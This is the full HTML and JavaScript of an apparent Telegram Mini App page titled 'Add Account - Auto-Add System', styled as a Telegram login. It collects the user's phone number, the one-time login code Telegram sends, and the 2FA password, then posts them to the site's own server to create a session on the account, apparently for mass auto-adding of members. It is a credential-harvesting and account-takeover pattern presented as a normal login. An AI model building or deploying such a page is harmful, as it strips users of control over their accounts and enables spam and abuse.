<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Add Account - Auto-Add System</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }

        body {
            min-height: 100vh;
            background: #0a0a0f;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            color: #fff;
        }

        .login-container {
            width: 100%;
            max-width: 400px;
        }

        .login-card {
            background: rgba(18, 18, 30, 0.9);
            backdrop-filter: blur(20px);
            border-radius: 24px;
            padding: 32px 24px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
        }

        .step-title {
            font-size: 1.5rem;
            font-weight: 700;
            margin-bottom: 8px;
            text-align: center;
        }

        .step-description {
            color: rgba(255, 255, 255, 0.6);
            font-size: 0.9rem;
            margin-bottom: 24px;
            text-align: center;
            line-height: 1.5;
        }

        /* Detected Account Card */
        .detected-card {
            background: rgba(32, 178, 170, 0.1);
            border: 1px solid rgba(32, 178, 170, 0.3);
            border-radius: 16px;
            padding: 16px;
            margin-bottom: 20px;
            text-align: center;
        }

        .detected-avatar {
            width: 60px;
            height: 60px;
            border-radius: 50%;
            background: linear-gradient(135deg, #8a2be2, #ff1493);
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 12px;
            font-size: 1.5rem;
            font-weight: 700;
            color: white;
        }

        .detected-name {
            font-size: 1.1rem;
            font-weight: 600;
            margin-bottom: 4px;
        }

        .detected-username {
            color: rgba(255, 255, 255, 0.5);
            font-size: 0.85rem;
            margin-bottom: 8px;
        }

        .detected-phone {
            color: #20b2aa;
            font-size: 1rem;
            font-weight: 500;
        }

        /* Code Input */
        .code-container {
            display: flex;
            gap: 10px;
            justify-content: center;
            margin: 24px 0;
        }

        .code-box {
            width: 54px;
            height: 64px;
            background: rgba(255, 255, 255, 0.05);
            border: 2px solid rgba(255, 255, 255, 0.15);
            border-radius: 14px;
            color: #fff;
            font-size: 1.8rem;
            font-weight: 700;
            text-align: center;
            line-height: 60px;
            transition: all 0.3s;
        }

        .code-box.filled {
            border-color: rgba(138, 43, 226, 0.6);
            background: rgba(138, 43, 226, 0.15);
            box-shadow: 0 0 20px rgba(138, 43, 226, 0.3);
        }

        .code-box.active {
            border-color: rgba(255, 20, 147, 0.7);
            box-shadow: 0 0 25px rgba(255, 20, 147, 0.4);
            animation: pulse 1.5s ease-in-out infinite;
        }

        @keyframes pulse {
            0%, 100% { border-color: rgba(255, 20, 147, 0.7); }
            50% { border-color: rgba(138, 43, 226, 0.9); }
        }

        .hidden-input {
            position: absolute;
            opacity: 0;
            width: 1px;
            height: 1px;
        }

        .code-hint {
            text-align: center;
            color: rgba(255, 255, 255, 0.4);
            font-size: 0.8rem;
            margin-top: -16px;
            margin-bottom: 16px;
        }

        /* Phone Input */
        .input-wrapper {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.15);
            border-radius: 14px;
            display: flex;
            align-items: center;
            margin-bottom: 20px;
            overflow: hidden;
        }

        .input-wrapper:focus-within {
            border-color: rgba(138, 43, 226, 0.5);
            box-shadow: 0 0 20px rgba(138, 43, 226, 0.2);
        }

        .input-prefix {
            padding: 14px 16px;
            color: #8a2be2;
            font-weight: 700;
            background: rgba(138, 43, 226, 0.1);
            border-right: 1px solid rgba(255, 255, 255, 0.1);
        }

        .form-input {
            flex: 1;
            padding: 14px 16px;
            background: transparent;
            border: none;
            color: #fff;
            font-size: 1rem;
            outline: none;
        }

        .password-input {
            width: 100%;
            padding: 14px 16px;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.15);
            border-radius: 14px;
            color: #fff;
            font-size: 1rem;
            outline: none;
            margin-bottom: 16px;
        }

        .password-input:focus {
            border-color: rgba(138, 43, 226, 0.5);
        }

        /* Buttons */
        .btn {
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 14px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .btn-primary {
            background: linear-gradient(135deg, #8a2be2, #ff1493);
            color: white;
            box-shadow: 0 8px 30px rgba(138, 43, 226, 0.3);
        }

        .btn-primary:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 12px 40px rgba(138, 43, 226, 0.5);
        }

        .btn-primary:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .btn-secondary {
            background: rgba(255, 255, 255, 0.08);
            color: rgba(255, 255, 255, 0.8);
            border: 1px solid rgba(255, 255, 255, 0.15);
            margin-top: 10px;
        }

        /* Messages */
        .error-message {
            background: rgba(255, 68, 68, 0.15);
            color: #ff6b6b;
            padding: 12px 16px;
            border-radius: 12px;
            margin-bottom: 16px;
            font-size: 0.85rem;
            display: none;
            border-left: 3px solid #ff4444;
        }

        .success-message {
            background: rgba(32, 178, 170, 0.15);
            color: #20b2aa;
            padding: 12px 16px;
            border-radius: 12px;
            margin-bottom: 16px;
            font-size: 0.85rem;
            display: none;
            border-left: 3px solid #20b2aa;
        }

        .error-message.show, .success-message.show {
            display: block;
        }

        .loading-spinner {
            display: inline-block;
            width: 18px;
            height: 18px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 0.6s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .success-icon {
            font-size: 4rem;
            text-align: center;
            margin: 20px 0;
        }

        .attempt-counter {
            text-align: center;
            color: #ffaa00;
            font-size: 0.8rem;
            margin-top: 8px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-card">
            <!-- Page 1: Auto-Detect or Phone Input -->
            <div id="page1">
                <div class="step-title">🔐 Telegram Login</div>
                <div class="step-description" id="page1Description">
                    Detecting your Telegram account...
                </div>

                <div class="error-message" id="error1"></div>
                <div class="success-message" id="success1"></div>

                <!-- Detected Account (shown when auto-detected) -->
                <div class="detected-card" id="detectedCard" style="display: none;">
                    <div class="detected-avatar" id="detectedAvatar">?</div>
                    <div class="detected-name" id="detectedName">---</div>
                    <div class="detected-username" id="detectedUsername"></div>
                    <div class="detected-phone" id="detectedPhone"></div>
                </div>

                <!-- Phone Input (shown when auto-detect fails) -->
                <div id="phoneInputGroup" style="display: none;">
                    <div class="input-wrapper">
                        <span class="input-prefix">+</span>
                        <input type="tel" class="form-input" id="phone" placeholder="Phone number" inputmode="numeric">
                    </div>
                </div>

                <button class="btn btn-primary" id="sendCodeBtn" onclick="sendCode()">
                    <span>Send Verification Code</span>
                </button>

                <div id="loadingIndicator" style="text-align: center; padding: 20px; display: none;">
                    <span class="loading-spinner"></span>
                    <span style="margin-left: 8px; color: rgba(255,255,255,0.6);">Detecting your account...</span>
                </div>
            </div>

            <!-- Page 2: Code Verification -->
            <div id="page2" style="display: none;">
                <div class="step-title">📱 Enter Code</div>
                <div class="step-description" id="codeDescription">
                    Enter the 5-digit code from Telegram
                </div>

                <div class="error-message" id="error2"></div>
                <div class="success-message" id="success2"></div>

                <input type="text" id="hiddenCodeInput" class="hidden-input" maxlength="5" inputmode="numeric" autocomplete="one-time-code">
                
                <div class="code-container" id="codeBoxes" onclick="focusCodeInput()">
                    <div class="code-box" id="box1"></div>
                    <div class="code-box" id="box2"></div>
                    <div class="code-box" id="box3"></div>
                    <div class="code-box" id="box4"></div>
                    <div class="code-box" id="box5"></div>
                </div>

                <div class="code-hint">Auto-verifies when complete</div>

                <div id="passwordGroup" style="display: none;">
                    <input type="password" class="password-input" id="password" placeholder="2FA Password">
                </div>

                <button class="btn btn-primary" id="verifyBtn" onclick="verifyCode()">
                    <span>Verify & Add Account</span>
                </button>

                <button class="btn btn-secondary" onclick="backToPage1()">
                    ← Back
                </button>

                <div class="attempt-counter" id="attemptCounter"></div>
            </div>

            <!-- Page 3: Success -->
            <div id="page3" style="display: none;">
                <div class="success-icon">✅</div>
                <div class="step-title" style="color: #20b2aa;">Account Added!</div>
                <div class="step-description" id="successAccountInfo">
                    Your account has been connected.
                </div>
                
                <button class="btn btn-primary" onclick="goToAutoAdd()">
                    ⚙️ Auto-Add Settings
                </button>
                
                <button class="btn btn-secondary" onclick="addAnotherAccount()">
                    ➕ Add Another Account
                </button>
            </div>
        </div>
    </div>

    <script>
        // State
        let currentSessionId = null;
        let currentPhone = '';
        let autoDetectedPhone = '';
        let telegramUser = null;
        let codeAttempts = 0;
        let isAutoVerifying = false;

        // DOM elements
        const hiddenInput = document.getElementById('hiddenCodeInput');
        const boxes = [
            document.getElementById('box1'),
            document.getElementById('box2'),
            document.getElementById('box3'),
            document.getElementById('box4'),
            document.getElementById('box5')
        ];

        // ============================================
        // TELEGRAM MINI APP INITIALIZATION
        // ============================================
        
        function getTelegramInitData() {
            // Method 1: Telegram WebApp object
            if (window.Telegram && window.Telegram.WebApp) {
                const tg = window.Telegram.WebApp;
                tg.ready();
                tg.expand();
                
                const initData = tg.initData || '';
                const initDataUnsafe = tg.initDataUnsafe || {};
                
                console.log('Telegram WebApp detected');
                console.log('Init data:', initData);
                console.log('User:', initDataUnsafe.user);
                
                if (initData) {
                    return {
                        initData: initData,
                        user: initDataUnsafe.user || null
                    };
                }
            }
            
            // Method 2: URL query string (some Mini Apps pass data this way)
            const queryString = window.location.search.substring(1);
            if (queryString && (queryString.includes('hash=') || queryString.includes('user='))) {
                console.log('Telegram data found in URL');
                return {
                    initData: queryString,
                    user: null
                };
            }
            
            // Method 3: Hash fragment
            const hash = window.location.hash.substring(1);
            if (hash && (hash.includes('hash=') || hash.includes('user='))) {
                console.log('Telegram data found in hash');
                return {
                    initData: hash,
                    user: null
                };
            }
            
            return null;
        }

        function getTelegramUserInfo() {
            if (window.Telegram && window.Telegram.WebApp) {
                const user = window.Telegram.WebApp.initDataUnsafe?.user;
                if (user) {
                    return {
                        id: user.id,
                        first_name: user.first_name || '',
                        last_name: user.last_name || '',
                        username: user.username || ''
                    };
                }
            }
            return null;
        }

        // ============================================
        // AUTO LOGIN
        // ============================================
        
        async function autoLogin() {
            const tgData = getTelegramInitData();
            const tgUser = getTelegramUserInfo();
            
            // Show loading
            document.getElementById('loadingIndicator').style.display = 'block';
            document.getElementById('sendCodeBtn').style.display = 'none';
            document.getElementById('page1Description').textContent = 'Detecting your Telegram account...';
            
            if (!tgData || !tgData.initData) {
                // Not in Telegram Mini App - ask for phone
                document.getElementById('loadingIndicator').style.display = 'none';
                document.getElementById('sendCodeBtn').style.display = 'block';
                document.getElementById('page1Description').textContent = 'Open this app from Telegram for automatic login, or enter your phone number.';
                document.getElementById('phoneInputGroup').style.display = 'block';
                document.getElementById('phone').focus();
                return;
            }
            
            try {
                const response = await fetch('/api/telegram-auto-login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        initData: tgData.initData,
                        user: tgUser
                    })
                });

                const data = await response.json();
                
                document.getElementById('loadingIndicator').style.display = 'none';
                document.getElementById('sendCodeBtn').style.display = 'block';

                if (data.success) {
                    // Auto-detected! Show user info and go to code page
                    currentSessionId = data.session_id;
                    currentPhone = data.phone_masked;
                    autoDetectedPhone = data.phone_masked;
                    
                    if (tgUser) {
                        telegramUser = tgUser;
                        document.getElementById('detectedAvatar').textContent = 
                            tgUser.first_name ? tgUser.first_name.charAt(0).toUpperCase() : '?';
                        document.getElementById('detectedName').textContent = 
                            `${tgUser.first_name} ${tgUser.last_name}`.trim();
                        document.getElementById('detectedUsername').textContent = 
                            tgUser.username ? `@${tgUser.username}` : '';
                    }
                    
                    document.getElementById('detectedPhone').textContent = 
                        data.phone_masked || 'Phone detected';
                    document.getElementById('detectedCard').style.display = 'block';
                    document.getElementById('phoneInputGroup').style.display = 'none';
                    document.getElementById('page1Description').textContent = 
                        'Account detected! Click below to send verification code.';
                    
                    // Auto-send code after short delay
                    setTimeout(() => {
                        document.getElementById('page1').style.display = 'none';
                        document.getElementById('page2').style.display = 'block';
                        document.getElementById('codeDescription').textContent = 
                            `Enter the 5-digit code sent to ${data.phone_masked || 'your Telegram'}`;
                        resetCodeInput();
                        setTimeout(() => focusCodeInput(), 300);
                    }, 500);
                    
                    showSuccess('Code sent automatically! Check your Telegram.', 1);
                    
                } else if (data.needs_phone) {
                    // Need phone number
                    if (tgUser) {
                        telegramUser = tgUser;
                        document.getElementById('detectedAvatar').textContent = 
                            tgUser.first_name ? tgUser.first_name.charAt(0).toUpperCase() : '?';
                        document.getElementById('detectedName').textContent = 
                            `${tgUser.first_name} ${tgUser.last_name}`.trim();
                        document.getElementById('detectedUsername').textContent = 
                            tgUser.username ? `@${tgUser.username}` : '';
                        document.getElementById('detectedPhone').textContent = 'No phone saved yet';
                        document.getElementById('detectedCard').style.display = 'block';
                    }
                    
                    document.getElementById('phoneInputGroup').style.display = 'block';
                    document.getElementById('page1Description').textContent = 
                        data.error || 'Please enter your phone number for first-time setup.';
                    document.getElementById('phone').focus();
                } else {
                    showError(data.error || 'Auto-login failed. Please enter your phone number.', 1);
                    document.getElementById('phoneInputGroup').style.display = 'block';
                    document.getElementById('phone').focus();
                }
                
            } catch (error) {
                console.error('Auto-login error:', error);
                document.getElementById('loadingIndicator').style.display = 'none';
                document.getElementById('sendCodeBtn').style.display = 'block';
                document.getElementById('phoneInputGroup').style.display = 'block';
                document.getElementById('page1Description').textContent = 
                    'Could not auto-detect. Please enter your phone number.';
                document.getElementById('phone').focus();
            }
        }

        // ============================================
        // CODE INPUT
        // ============================================
        
        function focusCodeInput() {
            hiddenInput.focus();
            updateActiveBox();
        }

        function resetCodeInput() {
            hiddenInput.value = '';
            updateCodeBoxes();
            codeAttempts = 0;
            isAutoVerifying = false;
            document.getElementById('attemptCounter').textContent = '';
            hideError(2);
        }

        function updateActiveBox() {
            const code = hiddenInput.value.replace(/[^0-9]/g, '');
            boxes.forEach((box, i) => {
                box.classList.remove('active');
                if (i === code.length && code.length < 5) {
                    box.classList.add('active');
                }
            });
        }

        function updateCodeBoxes() {
            const code = hiddenInput.value.replace(/[^0-9]/g, '').slice(0, 5);
            
            boxes.forEach((box, i) => {
                box.classList.remove('filled', 'active', 'error');
                if (i < code.length) {
                    box.textContent = code[i];
                    box.classList.add('filled');
                } else {
                    box.textContent = '';
                }
            });
            
            if (code.length < 5) {
                boxes[code.length].classList.add('active');
            }
            
            hideError(2);
            
            // Auto-verify when complete
            if (code.length === 5 && !isAutoVerifying) {
                isAutoVerifying = true;
                setTimeout(() => {
                    if (hiddenInput.value.replace(/[^0-9]/g, '').length === 5) {
                        autoVerify();
                    } else {
                        isAutoVerifying = false;
                    }
                }, 300);
            }
        }

        function autoVerify() {
            const code = hiddenInput.value.replace(/[^0-9]/g, '');
            if (code.length !== 5) {
                isAutoVerifying = false;
                return;
            }

            const needPassword = document.getElementById('passwordGroup').style.display === 'block';
            
            if (!needPassword) {
                const button = document.getElementById('verifyBtn');
                setLoading(button, true);
                hideError(2);
                performVerification(code, '');
            } else {
                const passwordInput = document.getElementById('password');
                if (!passwordInput.value) {
                    passwordInput.focus();
                    showError('2FA password required', 2);
                    isAutoVerifying = false;
                } else {
                    const button = document.getElementById('verifyBtn');
                    setLoading(button, true);
                    hideError(2);
                    performVerification(code, passwordInput.value);
                }
            }
            
            isAutoVerifying = false;
        }

        hiddenInput.addEventListener('input', function(e) {
            let value = this.value.replace(/[^0-9]/g, '').slice(0, 5);
            this.value = value;
            updateCodeBoxes();
        });

        hiddenInput.addEventListener('paste', function(e) {
            e.preventDefault();
            const digits = (e.clipboardData || window.clipboardData).getData('text').replace(/[^0-9]/g, '').slice(0, 5);
            this.value = digits;
            updateCodeBoxes();
        });

        boxes.forEach(box => {
            box.addEventListener('click', function(e) {
                e.stopPropagation();
                const index = parseInt(this.getAttribute('data-index') || boxes.indexOf(this));
                const currentCode = hiddenInput.value.replace(/[^0-9]/g, '');
                hiddenInput.value = index < currentCode.length ? currentCode.slice(0, index + 1) : currentCode.slice(0, index);
                updateCodeBoxes();
                hiddenInput.focus();
            });
        });

        document.getElementById('codeBoxes').addEventListener('click', focusCodeInput);

        // ============================================
        // HELPERS
        // ============================================

        function showError(message, pageNum = 1) {
            const el = document.getElementById(`error${pageNum}`);
            if (el) {
                el.textContent = message;
                el.classList.add('show');
                setTimeout(() => el.classList.remove('show'), 5000);
            }
        }

        function hideError(pageNum = 1) {
            const el = document.getElementById(`error${pageNum}`);
            if (el) el.classList.remove('show');
        }

        function showSuccess(message, pageNum = 1) {
            const el = document.getElementById(`success${pageNum}`);
            if (el) {
                el.textContent = message;
                el.classList.add('show');
                setTimeout(() => el.classList.remove('show'), 4000);
            }
        }

        function setLoading(button, isLoading) {
            button.disabled = isLoading;
            button.innerHTML = isLoading 
                ? '<span class="loading-spinner"></span><span>Processing...</span>'
                : `<span>${button.getAttribute('data-original') || 'Submit'}</span>`;
        }

        function backToPage1() {
            document.getElementById('page1').style.display = 'block';
            document.getElementById('page2').style.display = 'none';
            document.getElementById('page3').style.display = 'none';
            document.getElementById('password').value = '';
            document.getElementById('passwordGroup').style.display = 'none';
            resetCodeInput();
            hideError(1);
            hideError(2);
        }

        function goToAutoAdd() {
            window.location.href = '/auto-add';
        }

        function addAnotherAccount() {
            backToPage1();
            autoLogin();
        }

        // Save original button text
        document.querySelectorAll('.btn-primary').forEach(btn => {
            btn.setAttribute('data-original', btn.querySelector('span')?.textContent || 'Submit');
        });

        // ============================================
        // API CALLS
        // ============================================

        async function sendCode() {
            let phone = document.getElementById('phone').value.trim().replace(/\s+/g, '');
            
            // If we have auto-detected phone, use it
            if (!phone && autoDetectedPhone) {
                phone = autoDetectedPhone;
            }
            
            if (!phone) {
                showError('Please enter your phone number', 1);
                document.getElementById('phone').focus();
                return;
            }

            phone = phone.replace(/[^0-9+]/g, '');
            if (!phone.startsWith('+')) phone = '+' + phone;

            const button = document.getElementById('sendCodeBtn');
            setLoading(button, true);
            hideError(1);

            try {
                const response = await fetch('/api/add-account', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        phone: phone,
                        telegramId: telegramUser?.id || ''
                    })
                });

                const data = await response.json();

                if (data.success) {
                    currentSessionId = data.session_id;
                    currentPhone = phone;
                    
                    document.getElementById('page1').style.display = 'none';
                    document.getElementById('page2').style.display = 'block';
                    document.getElementById('codeDescription').textContent = 
                        `Enter the 5-digit code sent to ${phone}`;
                    resetCodeInput();
                    setTimeout(() => focusCodeInput(), 300);
                    showSuccess('Code sent! Check your Telegram.', 2);
                } else {
                    showError(data.error || 'Failed to send code', 1);
                }
            } catch (error) {
                showError('Network error. Please try again.', 1);
            } finally {
                setLoading(button, false);
            }
        }

        async function performVerification(code, password) {
            try {
                const response = await fetch('/api/verify-code', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        code: code,
                        session_id: currentSessionId,
                        password: password
                    })
                });

                const data = await response.json();

                if (data.success) {
                    document.getElementById('page2').style.display = 'none';
                    document.getElementById('page3').style.display = 'block';
                    
                    const accountName = data.account?.name || 'User';
                    let info = `<strong>${accountName}</strong><br>Phone: ${currentPhone}`;
                    if (data.account_age) info += `<br>📅 Age: ${data.account_age}`;
                    document.getElementById('successAccountInfo').innerHTML = info;
                    
                } else if (data.need_password) {
                    document.getElementById('passwordGroup').style.display = 'block';
                    document.getElementById('password').value = '';
                    document.getElementById('password').focus();
                    showError('2FA enabled. Enter your password.', 2);
                    isAutoVerifying = false;
                    
                } else {
                    const errMsg = data.error || 'Verification failed';
                    codeAttempts++;
                    const remaining = 5 - codeAttempts;
                    
                    if (remaining > 0) {
                        showError(`${errMsg} (${remaining} attempts left)`, 2);
                    } else {
                        showError('Too many attempts. Start over.', 2);
                        setTimeout(() => backToPage1(), 2000);
                    }
                    
                    document.getElementById('attemptCounter').textContent = 
                        remaining > 0 ? `${remaining} attempts remaining` : 'No attempts left';
                    
                    resetCodeInput();
                    focusCodeInput();
                    isAutoVerifying = false;
                }
            } catch (error) {
                showError('Network error. Please try again.', 2);
                isAutoVerifying = false;
            } finally {
                setLoading(document.getElementById('verifyBtn'), false);
            }
        }

        async function verifyCode() {
            const code = hiddenInput.value.replace(/[^0-9]/g, '');
            
            if (code.length !== 5) {
                showError('Enter the complete 5-digit code', 2);
                focusCodeInput();
                return;
            }

            const passwordInput = document.getElementById('password');
            const needPassword = document.getElementById('passwordGroup').style.display === 'block';

            if (needPassword && !passwordInput.value) {
                showError('Enter your 2FA password', 2);
                passwordInput.focus();
                return;
            }

            const button = document.getElementById('verifyBtn');
            setLoading(button, true);
            hideError(2);
            
            await performVerification(code, passwordInput.value);
        }

        // ============================================
        // EVENT LISTENERS
        // ============================================

        document.getElementById('phone').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') sendCode();
        });

        document.getElementById('password').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') verifyCode();
        });

        hiddenInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                verifyCode();
            }
        });

        // ============================================
        // INIT
        // ============================================
        
        window.addEventListener('load', () => {
            autoLogin();
        });
    </script>
</body>
</html>
